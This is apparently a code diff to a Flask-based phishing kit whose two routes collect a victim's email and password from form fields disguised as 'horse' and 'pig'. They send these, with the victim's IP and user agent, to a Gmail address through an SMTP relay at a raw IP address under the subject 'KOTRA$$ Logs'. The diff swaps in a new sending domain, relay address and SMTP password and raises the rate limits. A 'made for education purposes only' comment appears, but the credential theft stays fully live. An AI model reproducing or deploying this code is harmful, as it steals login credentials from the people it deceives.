@@ -15,7 +15,7 @@ from email.mime.multipart import MIMEMultipart
 # made for education purposes only
 
 app = Flask(__name__)
-limiter = Limiter(get_remote_address, app=app, default_limits=["7 per day", "7 per hour"])
+limiter = Limiter(get_remote_address, app=app, default_limits=["10 per day", "10 per hour"])
 secret_keyx = secrets.token_urlsafe(24)
 app.secret_key = secret_keyx
 
@@ -191,10 +191,10 @@ def first():
             ip = request.remote_addr
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
-        sender_email = "auto528@ecofuture.bio"
+        sender_email = "auto528@cryptasphere.bio"
         sender_emaill = "auto528"
         receiver_email = "danielnewwoj@gmail.com"
-        password = "vipb2b84382e351"
+        password = "vip7a81be0e2b36"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
         message["Subject"] = "KOTRA$$ Logs "
@@ -210,7 +210,7 @@ def first():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP("62.106.66.84", 6040) as server:
+        with smtplib.SMTP("146.19.254.243", 6040) as server:
             server.login(sender_emaill, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         # Set session value and redirect
@@ -231,10 +231,10 @@ def second():
             ip = request.remote_addr
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
-        sender_email = "auto528@ecofuture.bio"
+        sender_email = "auto528@cryptasphere.bio"
         sender_emaill = "auto528"
         receiver_email = "danielnewwoj@gmail.com"
-        password = "vipb2b84382e351"
+        password = "vip7a81be0e2b36"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
         message["Subject"] = "KOTRA$$ Logs  !! "
@@ -250,7 +250,7 @@ def second():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP("62.106.66.84", 6040) as server:
+        with smtplib.SMTP("146.19.254.243", 6040) as server:
             server.login(sender_emaill, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         session['ins'] = email  # Save email as session variable
